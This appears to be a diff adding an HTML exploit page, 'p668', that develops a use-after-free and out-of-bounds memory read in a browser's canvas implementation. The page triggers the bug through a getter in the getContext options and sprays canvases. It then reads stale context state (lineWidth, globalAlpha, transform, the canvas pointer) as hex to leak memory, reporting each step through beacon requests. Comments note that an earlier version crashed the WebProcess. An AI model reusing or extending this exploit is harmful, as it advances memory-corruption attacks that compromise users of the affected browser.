@@ -1,0 +1,119 @@
+<!--
+  p668: OOB state stack read — careful version
+  p667 CRASHED WebProcess in a loop (only START beacon arrived).
+  This version: minimal spray, beacon after EVERY step, single save.
+  CRASH_CLASS: HIGH
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p668</title></head>
+<body>p668: careful OOB statestack
+<pre id="log" style="color:#0f0;background:#000;font:12px monospace;padding:8px;white-space:pre-wrap"></pre>
+<script>
+(function(){
+'use strict';
+var L=document.getElementById('log'),bQ=[];
+function emit(t,m){var s=t+(m!==undefined?' '+m:'');L.textContent+=s+'\n';bQ.push(s);if(bQ.length>=1)flush();}
+function flush(){if(!bQ.length)return;var b=bQ.splice(0,2).join('|');try{var x=new XMLHttpRequest();x.open('GET','/beacon/P668-'+encodeURIComponent(b),false);x.send();}catch(e){}}
+window.onerror=function(m){emit('ERR',String(m).slice(0,120));flush();};
+var f64=new Float64Array(1),u8=new Uint8Array(f64.buffer);
+function d2hex(d){f64[0]=d;var h='';for(var i=7;i>=0;i--)h+=('0'+u8[i].toString(16)).slice(-2);return h;}
+
+emit('START','v1');flush();
+
+// Step 1: create canvas + UAF trigger
+var canv=document.createElement('canvas');
+canv.width=1;canv.height=1;
+var inner=null;
+emit('S1','creating-uaf');flush();
+
+try{
+  var outer=canv.getContext('bitmaprenderer',{
+    get alpha(){
+      inner=canv.getContext('2d');
+      return true;
+    }
+  });
+}catch(e){emit('S1-ERR',e.message);flush();}
+
+if(!inner){emit('FATAL','no inner context');flush();}
+else{
+
+emit('S2','inner-created');flush();
+
+// Step 2: set known value on stale ref
+try{
+  inner.lineWidth=42.5;
+  inner.globalAlpha=0.777;
+  emit('S3','lw='+inner.lineWidth+',ga='+inner.globalAlpha);flush();
+}catch(e){emit('S3-ERR',e.message);flush();}
+
+// Step 3: ONE save only (minimal)
+try{
+  inner.save();
+  inner.lineWidth=99.99;
+  emit('S4','saved-once,lw='+inner.lineWidth);flush();
+}catch(e){emit('S4-ERR',e.message);flush();}
+
+// Step 4: small spray (50 only, not 150)
+emit('S5','spraying-50');flush();
+try{
+  var spray=[];
+  for(var i=0;i<50;i++){
+    var c=document.createElement('canvas');
+    c.width=1;c.height=1;
+    spray.push(c.getContext('2d'));
+  }
+  emit('S6','spray-done');flush();
+}catch(e){emit('S6-ERR',e.message);flush();}
+
+// Step 5: read lineWidth from stale ref (THIS is where p667 crashed)
+emit('S7','reading-lineWidth');flush();
+try{
+  var lw=inner.lineWidth;
+  emit('S8-LW','val='+lw+',hex='+d2hex(lw));flush();
+}catch(e){emit('S8-ERR',e.message);flush();}
+
+// Step 6: read globalAlpha
+emit('S9','reading-globalAlpha');flush();
+try{
+  var ga=inner.globalAlpha;
+  emit('S10-GA','val='+ga+',hex='+d2hex(ga));flush();
+}catch(e){emit('S10-ERR',e.message);flush();}
+
+// Step 7: read miterLimit
+emit('S11','reading-miterLimit');flush();
+try{
+  var ml=inner.miterLimit;
+  emit('S12-ML','val='+ml+',hex='+d2hex(ml));flush();
+}catch(e){emit('S12-ERR',e.message);flush();}
+
+// Step 8: read transform
+emit('S13','reading-transform');flush();
+try{
+  var tx=inner.getTransform();
+  emit('S14-TX','a='+tx.a+',b='+tx.b+',c='+tx.c+',d='+tx.d+',e='+tx.e+',f='+tx.f);flush();
+  emit('S14-HEX','a='+d2hex(tx.a)+',d='+d2hex(tx.d)+',e='+d2hex(tx.e)+',f='+d2hex(tx.f));flush();
+}catch(e){emit('S14-ERR',e.message);flush();}
+
+// Step 9: try restore then read (this accesses previous state level)
+emit('S15','restoring');flush();
+try{
+  inner.restore();
+  var lw2=inner.lineWidth;
+  var ga2=inner.globalAlpha;
+  emit('S16-POST','lw='+lw2+',ga='+ga2+',lwH='+d2hex(lw2));flush();
+}catch(e){emit('S16-ERR',e.message);flush();}
+
+// Step 10: try canvas property (accesses m_canvas pointer)
+emit('S17','reading-canvas');flush();
+try{
+  var cv=inner.canvas;
+  emit('S18-CV','canvas='+(cv?'exists':'null')+',w='+(cv?cv.width:'?'));flush();
+}catch(e){emit('S18-ERR',e.message);flush();}
+
+// Summary
+emit('DONE','p668-complete');flush();
+}
+})();
+</script>
+</body>
+</html>
